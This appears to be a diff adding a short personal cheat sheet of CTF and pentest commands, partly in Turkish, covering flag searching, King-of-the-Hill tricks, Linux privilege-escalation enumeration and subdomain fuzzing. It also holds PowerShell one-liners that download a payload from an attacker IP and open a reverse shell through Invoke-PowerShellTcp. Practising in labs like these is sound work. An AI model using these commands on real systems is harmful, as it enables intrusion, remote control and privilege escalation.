@@ -1,0 +1,57 @@
+grep -rnw /var -e 'THM' 2>/dev/null
+grep -Ra thm
+find / -name flag
+chattr +i king.txt
+grep -e [0-9a-f]{32}
+ps aux | grep root
+grep -Ri th{ 2>/dev/null
+grep -Ri th{ 2>/dev/null
+sudo pkill -9 -u <nickname>
+------------------------------------
+
+find / -perm -4000 2> /dev/null
+find / -perm -u=s -type f 2>/dev/null
+getcap -r / 2>/dev/null
+cat /etc/crontab
+sudo netstat -tulpn | grep LISTEN
+
+chmod u-s == SUİD PATCH
+chmod g-s filename //SGID PATH
+------------------------------------
+
+nano /etc/hosts.allow --> sshd:10.9.184.17
+nano /etc/hosts.deny  --> sshd:ALL
+
+------------------------------------
+
+powershell ile wgey == powershell -c "Invoke-WebRequest -Uri 'http://10.11.53.74/priv.exe' -outfile 'priv.exe'"
+
+-------------------------------------
+
+Invoke-powershelltcp alma
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+
+------------------------------------
+
+Invoke-powershelltcp'den sonra meterpreter shell change  
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.53.74/priv.exe','priv.exe')"
+
+-----------------------------------
+whoami /priv en önemliler
+    SeImpersonatePrivilege
+    SeAssignPrimaryPrivilege
+    SeTcbPrivilege
+    SeBackupPrivilege
+    SeRestorePrivilege
+    SeCreateTokenPrivilege
+    SeLoadDriverPrivilege
+    SeTakeOwnershipPrivilege
+    SeDebugPrivilege
+------------------------------------
+wfuzz -c -w subdomains-top1million-110000.txt.1 --sc 200,202,204,307,403 --hc 301 -u 'http://horizontall.htb/' -H "Host: FUZZ.horizontall.htb"
+
+
+
+sudo tcpdump -i eth0 icmp == rce test
